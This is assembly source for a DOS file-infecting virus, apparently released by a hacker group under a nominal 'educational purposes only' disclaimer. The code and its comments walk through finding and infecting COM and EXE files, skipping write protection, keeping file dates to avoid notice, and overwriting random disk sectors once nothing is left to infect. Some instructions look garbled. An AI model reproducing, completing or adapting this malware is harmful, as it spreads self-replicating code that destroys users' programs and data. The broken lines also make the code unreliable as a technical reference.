;=============================================================================
;
;                                    C*P*I
;
;                     CORRUPTED PROGRAMMING INTERNATIONAL
;                     -----------------------------------
;                               p r e s e n t s
;
;                                    T H E
;                              _                 _
;                             (g) GENERIC VIRUS (g)
;                              ^                 ^
;
;
; A GENERIC VIRUS - THIS ONE MODIFIES ALL COM AND EXE FILES AND ADDS A BIT OF
;   CODE IN AND MAKES EACH A VIRUS. HOWEVER, WHEN IT MODIFIES EXE FILES, IT
; RENAMES THE EXE TO A COM, CAUSING DOS TO GIVE THE ERROR “PROGRAM TO BIG TO
;    FIT IN MEMORY” THIS WILL BE REPAIRED IN LATER VERSIONS OF THIS VIRUS.
;
; WHEN IT RUNS OUT OF FILES TO INFECT, IT WILL THEN BEGIN TO WRITE GARBAGE ON
;                     THE DISK. HAVE PHUN WITH THIS ONE.
;
;  ALSO NOTE THAT THE COMMENTS IN (THESE) REPRESENT DESCRIPTION FOR THE CODE
;  IMMEDIATE ON THAT LINE. THE OTHER COMMENTS ARE FOR THE ENTIRE ;| GROUPING.
;
;  THIS FILE IS FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR AND CPI WILL NOT BE
;   HELD RESPONSIBLE FOR ANY ACTIONS DUE TO THE READER AFTER INTRODUCTION OF
;  THIS VIRUS. ALSO, THE AUTHOR AND CPI DO NOT ENDORSE ANY KIND OF ILLEGAL OR
;             ILLICIT ACTIVITY THROUGH THE RELEASE OF THIS FILE.
;
;                                                        DOCTOR DISSECTOR
;                                                        CPI ASSOCIATES
;
;=============================================================================

MAIN:
      NOP                       ;| Marker bytes that identify this program
      NOP                       ;| as infected/a virus
      NOP                       ;|

      MOV AX,00                 ;| Initialize the pointers
      MOV ES:[POINTER],AX       ;|
      MOV ES:[COUNTER],AX       ;|
      MOV ES:[DISKS B],AL       ;|

      MOV AH,19                 ;| Get the selected drive (dir?)
      INT 21                    ;|

      MOV CS:DRIVE,AL           ;| Get current path (save drive)
      MOV AH,47                 ;| (dir?)
      MOV DH,0                  ;|
      ADD AL,1                  ;|
      MOV DL,AL                 ;| (in actual drive)
      LEA SI,CS:OLD_PATH        ;|
      INT 21                    ;|

      MOV AH,0E                 ;| Find # of drives 
      MOV DL,0                  ;|
      INT 21                    ;|
      CMP AL,01                 ;| (Check if only one drive)
      JNZ HUPS3                 ;| (If not one drive, go the HUPS3)
      MOV AL,06                 ;| Set pointer to SEARCH_ORDER +6 (one drive)

      HUPS3: MOV AH,0           ;| Execute this if there is more than 1 drive
      LEA BX,SEARCH_ORDER       ;|
      ADD BX,AX                 ;|
      ADD BX,0001               ;|
      MOV CS:POINTER,BX         ;|
      CLC                       ;|

CHANGE_DISK:                    ;| Carry is set if no more .COM files are
      JNC NO_NAME_CHANGE        ;| found. From here, .EXE files will be
      MOV AH,17                 ;| renamed to .COM (change .EXE to .COM)
      LEA DX,CS:MASKE_EXE       ;| but will cause the error message “Program  
      INT 21                    ;| to large to fit in memory” when starting
      CMP AL,0FF                ;| larger infected programs
      JNZ NO_NAME_CHANGE        ;| (Check if an .EXE is found)

      MOV AH,2CH                ;| If neither .COM or .EXE files can be found,
      INT 21                    ;| then random sectors on the disk will be
      MOV BX,CS:POINTER         ;| overwritten depending on the system time
      MOV AL,CS:[BX]            ;| in milliseconds. This is the time of the
      MOV BX,DX                 ;| complete “infection” of a storage medium.
      MOV CX,2                  ;| The virus can find nothing more to infect
      MOV DH,0                  ;| starts its destruction.
      INT 26                    ;| (write crap on disk)

NO_NAME_CHANGE:                 ;| Check if the end of the search order table
      MOV BX,CS:POINTER         ;| has been reached. If so, end.
      DEC BX                    ;|
      MOV CS:POINTER,BX         ;|
      MOV DL,CS:[BX]            ;|
      CMP DL,0FF                ;|
      JNZ HUPS2                 ;|
      JMP HOPS                  ;|
      
HUPS2:                          ;| Get a new drive from the search order table
      MOV AH,0E                 ;| and select it, beginning with the ROOT dir.
      INT 21                    ;| (change drive)
      MOV AH,3B                 ;| (change path)
      LEA DX,PATH               ;|
      INT 21                    ;|
      JMP FIND_FIRST_FILE       ;|

FIND_FIRST_SUBDIR:              ;| Starting from the root, search for the
      MOV AH,17                 ;| first subdir. First, (change .exe to .com)
      LEA DX,CS:MASKE_EXE       ;| convert all .EXE files to .COM in the
      INT 21                    ;| old directory.
      MOV AH,3B                 ;| (use root directory)
      LEA DX,PATH               ;|
      INT 21                    ;|
      MOV AH,04E                ;| (search for first subdirectory)
      MOV CX,00010001B          ;| (dir mask)
      LEA DX,MASKE_DIR          ;|
      INT 21                    ;|
      JC CHANGE_DISK            ;|
      MOV BX,CS:COUNTER         ;|
      INC BX                    ;|
      DEC BX                    ;|
      JZ  USE_NEXT_SUBDIR       ;|

FIND_NEXT_SUBDIR:               ;| Search for the next sub-dir, if no more
      MOV AH,4FH                ;| are found, the (search for next subdir)
      INT 21                    ;| drive will be changed.
      JC CHANGE_DISK            ;|
      DEC BX                    ;|
      JNZ FIND_NEXT_SUBDIR      ;|

USE_NEXT_SUBDIR:      
      MOV AH,2FH                ;| Select found directory. (get dta address)
      INT 21                    ;|
      ADD BX,1CH                ;|
      MOV ES:[BX],W”\”          ;| (address of name in dta)
      INC BX                    ;|
      PUSH DS                   ;|
      MOV AX,ES                 ;|
      MOV DS,AX                 ;|
      MOV DX,BX                 ;|
      MOV AH,3B                 ;| (change path)
      INT 21                    ;|
      POP DS                    ;|
      MOV BX,CS:COUNTER         ;|
      INC BX                    ;|
      MOV CS:COUNTER,BX         ;|

FIND_FIRST_FILE:                ;| Find first .COM file in the current dir.
      MOV AH,04E                ;| If there are none, (Search for first)
      MOV CX,00000001B          ;| search the next directory. (mask)
      LEA DX,MASKE_COM          ;|
      INT 21                    ;|
      JC FIND_FIRST_SUBDIR      ;|
      JMP CHECK_IF_ILL          ;|

FIND_NEXT_FILE:                 ;| If program is ill (infected) then search
      MOV AH,4FH                ;| for another. (search for next)
      INT 21                    ;|
      JC FIND_FIRST_SUBDIR      ;|

CHECK_IF_ILL:                   ;| Check if already infected by virus.
      MOV AH,3D                 ;| (open channel)
      MOV AL,02                 ;| (read/write)
      MOV DX,9EH                ;| (address of name in dta)
      INT 21                    ;|
      MOV BX,AX                 ;| (save channel)
      MOV AH,3FH                ;| (read file)
      MOV CH,BUFLEN             ;|
      MOV DX,BUFFER             ;| (write in buffer)
      INT 21                    ;|
      MOV AH,3EH                ;| (close file)
      INT 21                    ;|
      MOV BX,CS:[BUFFER]        ;| (look for three NOP’s)
      CMP BX,9090               ;| 
      JZ FIND_NEXT_FILE         ;|

      MOV AH,43                 ;| This section by-passes (write enable)
      MOV AL,0                  ;| the MS/PC DOS Write Protection.
      MOV DX,9EH                ;| (address of name in dta)
      INT 21                    ;|
      MOV AH,43                 ;|
      MOV AL,01                 ;|
      AND CX,11111110B          ;|
      INT 21                    ;|

      MOV AH,3D                 ;| Open file for read/write (open channel)
      MOV AL,02                 ;| access (read/write)
      MOV DX,9EH                ;| (address of name in dta)
      INT 21                    ;|

      MOV BX,AX                 ;| Read date entry of program and (channel)
      MOV AH,57                 ;| save for future use. (get date)
      MOV AL,0                  ;|
      INT 21                    ;|
      PUSH CX                   ;| (save date)
      PUSH DX                   ;|

      MOV DX,CS:[CONTA W]       ;| The jump located at 0100h (save old jmp)
      MOV CS:[JMPBUF],DX        ;| the program will be saved for future use.
      MOV DX,CS:[BUFFER+1]      ;| (save new jump)
      LEA CX,CONT-100           ;|
      SUB DX,CX                 ;|
      MOV CS:[CONTA],DX         ;|

      MOV AH,57                 ;| The virus now copies itself to (write date)
      MOV AL,1                  ;| to the start of the file.
      POP DX                    ;| 
      POP CX                    ;| (restore date)
      INT 21                    ;|
      MOV AH,3EH                ;| (close file)
      INT 21                    ;|

      MOV DX,CS:[JMPBUF]        ;| Restore the old jump address. The virus
      MOV CS:[CONTA],DX         ;| at address “CONTA” the jump which was at the
                                ;| start of the program. This is done to
HOPS:                           ;| preserve the executability of the host
      NOP                       ;| program as much as possible. After saving,
      CALL USE_OLD              ;| it still works with the jump address in the
                                ;| virus. The jump address in the virus differs
                                ;| from the jump address in memory
    
CONT  DB  0E9                   ;| Continue with the host program (make jump)
CONTA DW  0                     ;|
      MOV AH,00                 ;|
      INT 21                    ;|

USE_OLD:
      MOV AH,0E                 ;| Reactivate the selected (use old drive)
      MOV DL,CS:DRIVE           ;| drive at the start of the program, and
      INT 21                    ;| reactivate the selected path at the start
      MOV AH,3B                 ;| of the program.(use old drive)
      LEA DX,OLD_PATH-1         ;| (get old path and backslash)
      INT 21                    ;| 
      RET                       ;|

SEARCH_ORDER DB 0FF,1,0,2,3,0FF,00,0FF

POINTER      DW   0000          ;| (pointer f. search order)
COUNTER      DW   0000          ;| (counter f. nth. search) 
DISKS        DB   0             ;| (number of disks)
MASKE_COM    DB “*.COM”,00      ;| (search for com files)
MASKE_DIR    DB “*”,00          ;| (search for dir’s)
MASKE_EXE    DB 0FF,0,0,0,0,0,00111111XB
             DB 0,”????????EXE”,0,0,0,0
             DB 0,”????????COM”,0
MASKE_ALL    DB 0FF,0,0,0,0,0,00111111XB
             DB 0,”???????????”,0,0,0,0
             DB 0,”????????COM”,0

BUFFER EQU 0E00                 ;| (a safe place)

BUFLEN EQU 208H                 ;| Length of virus. Modify this accordingly
                                ;| if you modify this source. Be careful
                                ;| for this may change!

JMPBUF EQU BUFFER+BUFLEN        ;| (a safe place for jmp)

PATH  DB “\”,0                  ;| (first place)
DRIVE DB 0                      ;| (actual drive)
BACK_SLASH DB “\”
OLD_PATH DB 32 DUP (?)          ;| (old path)
